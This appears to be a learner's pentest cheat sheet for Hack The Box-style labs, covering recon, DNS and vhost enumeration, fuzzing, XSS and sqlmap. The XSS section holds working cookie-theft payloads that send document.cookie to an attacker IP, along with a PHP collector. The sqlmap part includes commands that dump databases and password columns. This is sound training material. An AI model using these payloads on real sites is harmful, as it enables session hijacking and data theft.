## cURL (Client URL)

| Command | Description |
|--------|------------|
| `curl -O` | Download a page or file and save output to disk |
| `curl -u user:pass` | Authenticate using username and password |
| `curl -h` | Display available cURL options |
| `curl -k` | Skip SSL certificate verification |
| `curl -v` | Show full HTTP request and response |
| `curl -vvv` | Extremely verbose HTTP output |
| `curl -I` | Check HTTP headers information |

## cURL Examples

| Command | Description |
|--------|------------|
| `curl -X POST -d '{"search":"flag"}' -b 'PHPSESSID=<cookie>' -H 'Content-Type: application/json' http://target:port/query.php` | POST request with JSON body and session cookie |
| `curl -u username:password http://target:port/query.php?name=flag` | GET request using basic authentication |

## CRUD API

| Operation | HTTP Method |
|----------|-------------|
| Create | `POST` |
| Read | `GET` |
| Update | `PUT` |
| Delete | `DELETE` |

## CRUD API Examples

| Command | Description |
|--------|------------|
| `curl -X PUT http://target:port/api.php/city/Boston -d '{"city_name":"flag"}' -H 'Content-Type: application/json'` | Update resource |
| `curl -X DELETE http://target:port/api.php/city/anycity` | Delete resource |
| `curl -X GET http://target:port/api.php/city/flag` | Read resource |

## NSLOOKUP

| Command | Description |
|--------|------------|
| `nslookup example.com` | Resolve domain to IP |
| `nslookup -type=A example.com` | Retrieve A record |
| `nslookup -type=NS example.com` | Retrieve NS records |

## DIG

| Command | Description |
|--------|------------|
| `dig example.com` | Query DNS records |
| `dig A example.com` | Retrieve A record |
| `dig AAAA example.com` | Retrieve IPv6 record |
| `dig MX example.com` | Retrieve mail servers |
| `dig AXFR @targetIP example.com` | Attempt DNS zone transfer |

## DNSEnum

| Command | Description |
|--------|------------|
| `dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt` | Enumerate subdomains |

## GoBuster
```bash
echo "IP target.com" | sudo tee -a /etc/hosts   # add vhost to hosts file before
-s   # include responses in filter 301, 302 etc..
-b   # exclude responses in filter 404 (do this)
--exclude-length   #exclude responses with specific content lengths
```
| Command | Description |
|--------|------------|
| `gobuster vhost -u http://targetIP:port -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 500 --append-domain` | Gobuster Virtual host brute-force |
| `gobuster dir -u http://target/admin -w wordlist.txt` | Enumerate deeper directories 
| `gobuster vhost -u http://sub vhost:port -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 500 --append-domain` | Brute-force for sub-vhosts too! |
| `gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` | Gobuster DNS fuzzing good for discovering subdomains |

## Certificate Transparency Logs

| Command | Description |
|--------|------------|
| `curl -s "https://crt.sh/?q=facebook.com&output=json" \| jq -r '.[] \| select(.name_value \| contains(\"dev\")) \| .name_value' \| sort -u` | Enumerate dev subdomains from CT logs |

## Robots.txt 

| Command | Description |
|--------|------------|
| `curl http://target/robots.txt`| Retrieve robots.txt file to try and find any hidden directories, panels, flags |

## ReconSpider

| Command | Description |
|--------|------------|
| `pip3 install scrapy` | install Scrapy |
| `wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip` | Download ReconSpider |
| `unzip ReconSpider.zip` | Unzip the file |
| `python3 reconspider.py http://target` | Crawl website to enumerate URLs, endpoints, and parameters. Downloaded on files |

## Skills Assessment
| Command | Description |
|--------|------------|
| `sudo nano /etc/hosts` | Add a line mapping target IP to vhost name NO PORT |
| `whois target` | Used for recon good for organization, country, registrar info |
| `curl web1337.inlanefreight.htb:53710/robots.txt` | Shows hidden paths |
| `curl web1337.inlanefreight.htb:53710/admin_h1dd3n/` | Disallowed path INCLUDE the / | `gobuster vhost -u http://web1337.inlanefreight.htb:53710 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 500 --append-domain | Brute force for the sub-vhost |
| `python3 ReconSpider.py http://dev.web1337.inlanefreight.htb:53710` | Crawl to find Emails/Links |

### Conclusion

- used gobuster to find correct vhost, added each discovered vhost to /etc/hosts, checked each vhost for additional sub vhosts
- found robots.txt on one vhost, curled robots.txt, robots.txt revealed hidden directory /admin_h1dd3n
- accessing /admin_h1dd3n returned 301, followed redirect to /admin_h1dd3n/, hidden admin directory accessible

# Web Fuzzing
## Installations
```bash
sudo apt install -y golang     # Go
sudo apt install -y python3 python3-pip
sudo apt install pipx     # pipx
go install github.com/ffuf/ffuf/v2@latest      #ffuf
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | sudo bash -s $HOME/.local/bin     #FeroxBuster
```
## Word Lists
| Command | Description |
|--------|------------|
| `/usr/share/seclists/Discovery/Web-Content/common.txt` | General Wordlist with Common directory/file names |
| `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` | Dictionary Wordlist for deeper directories |
| `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt` | Large Dictionary |
| `/usr/share/seclists/Discovery/Web-Content/big.txt` | Big wordlist for wide net |

## ffuf & wenum
```bash
# ffuf
-mc   # match codes/responses you want so if you want 200 -mc 200
-fc   # exclude responses you dont want -fc 404
-ms   # include responses that match a specific size, if a file is 3456 bytes -ms 3456
ffuf -u http://example.com/FUZZ -w wordlist.txt -mc 200 -ms >500   # good example

# wenum
--hc   # exclude responses you dont want --hc 404
--sc   # include responses you want --sc 200
-ss    # include only responses with the specified response size --ss 205
# more examples in module
```
| Command | Description |
|--------|------------|
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://94.237.123.185:46201/webfuzzing_hidden_path/FUZZ -e .php,.html,.txt,.bak,.js -v` | Checks for directories by plugging in words through common.txt and replacing FUZZ. Use all extensions to not miss anything |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -v -u http://target:PORT/FUZZ -e .html -recursion` | Recursion Fuzzing, good for nested directories |
| `ffuf -u http://83.136.255.53:44097/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v` | Fuzz on a POST request |
| `wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u "http://83.136.255.53:44097/get.php?x=FUZZ"` | Fuzz GET and POST parameters |

# API Fuzzing
```bash
git clone https://github.com/PandaSt0rm/webfuzz_api.git  # installation
cd webfuzz_api
pip3 install -r requirements.txt
```
| Command | Description |
|--------|------------|
| `python3 api_fuzzer.py http://IP:PORT` | Run fuzzer on target |


# Web Fuzzing Assessment

| Command | Description |
|--------|------------|
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -v -ic -u http://94.237.61.202:40518/admin/FUZZ -e .php` | Remember to add -e .php when directory fuzzing or PHP files won’t show up. |
| `curl http://94.237.61.202:40518/admin/panel.php` | Always curl when finding new directory, output shows parameter is accessID |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -v -ic -u http://94.237.61.202:40518/admin/panel.php?accessID=FUZZ -fs 58` | Filter out all the same sizes to find the anomaly |
| `ffuf -ic -u http://fuzzing_fun.htb:40518 -H "Host: FUZZ.fuzzing_fun.htb" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 403` | Find other vhosts |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -ic -u http://hidden.fuzzing_fun.htb:40518/godeep/FUZZ -recursion` | -ic ignores comments in wordlists |

**Takeaways**
- Filter noise early using -fc, -fw, or -fs
- 403 files usually mean wrong entry point, not the vuln (HTB trickery)
- Add new vhosts to etc/hosts and ffuf each one, if there is nothing then your probably in the wrong spot

## Java Deobfuscation

- Check source code for src=js file. Deobfuscate code if needed at --> https://matthewfl.com/unPacker.html
- https://gchq.github.io/CyberChef/ and CTRL + SHIFT + J for additional help

## Cross-Site Scripting (XSS)

| Command | Description |
|--------|------------|
| `<script>alert(window.origin)</script>`| XSS Payload confirming JS execution|
| `<script>print(test)</script>` | XSS Payload confirming JS execution WITHOUT ALERTS |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Get Victim's Cookie 
| `<img src="" onerror=alert(window.origin)>` | Loads invalid image |
| `<svg onload=alert(1)>` | Exploits svg |
| `<plaintext> ` | Breaks HTML parsing, tests HTML injection |
# XSS Assessment
```bash
# Start Local Listener
mkdir /tmp/xss
cd /tmp/xss
sudo php -S 0.0.0.0:80  #8000 if 80 doesnt work but change commands to 8000
```
**Create Script.js & Index.php file to Steal Cookies (IMPORTANT)**
```bash
nano script.js
# put this in script.js
new Image().src='http://10.10.14.5:8000/index.php?c='+document.cookie;

nano index.php
# put this in index.php
<?php
if (isset($_GET['c'])) {
    file_put_contents("cookies.txt", $_GET['c']);
}
?>

```
| Command | Description |
|--------|------------|
| `<script src="http://10.10.14.5:8000/FIELDNAME"></script>`| Find vulnerable field |
| `http://example.com"><script src="http://10.10.14.5:8000/website"></script>` | Example for Website |

**Takeaways**
- This is for Blind XSS, Reflected/Stored would show already when tested.
- Explore the site and dont use the first search you see.
- Check source code and go step by step I just listed (take your time)

## SQLMap
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap.py
```
| Command | Description |
|--------|------------|
| `sqlmap -u "http://target:PORT/test.php" --data="id=1"` | Identify Injectable POST (id) | 
| `sqlmap -u "http://target:PORT/test.php" --data="id=1" --dbs` | Look for available DB. (Info_schema is normal) |
| `sqlmap -u "http://target:PORT/test.php" --data="id=1" -D testdb --tables` | Found DB (testdb) and use --tables to look for whats inside it |
| `sqlmap -u "http://target:PORT/test.php" --data="id=1" -D testdb -T flag2 --dump` | Saw Flag2 as a table and --dump contents |
| `sqlmap -u "http://target:PORT/test.php" --cookie="id=1" -p id --level=5 --risk=3` | Force SQLi Testing on Injectable Cookie Value (id) |
| `sqlmap -u "http://target:PORT/test.php" --cookie="id=1" -D testdb -T flag3 --dump` | Repeat same process as ABOVE example ^ |
| `POST /test.php {"id":1}` | With JSON, use BurpSuite -> Proxy -> Send to Repeater -> Copy to file -> Cat the file in bash |
| `sqlmap -r test.txt -pd id --dbs --batch` | Same process, find DB -> find tables inside DB -> dump flag |
| `sqlmap -u "http://target:PORT/test.php?id=1" -D testdb -T flag5 --dump --no-cast --fresh-queries` | Fresh Queries ensured clean binary data. |
| `sqlmap -u "http://target:PORT/test.php?col=id" --prefix='(look up prefixes)' --level=5 --risk=3 -D testdb -T flag6 --dump --no-cast` | Use Prefix with column usage to escape wrapped context. |
| `sqlmap -u "http://target:PORT/case7.php?id=1" --union-cols=5 --no-cast -D testdb -T flag7 --dump` | Specify # of collumns for UNION SQLi. |
| `sqlmap -u "http://target:PORT/case1.php?id=1" -D testdb -T users -C id,name,password --dump` | Grab User Table/Crack Passwords (Use Wordlist and Select No for Slow Option)
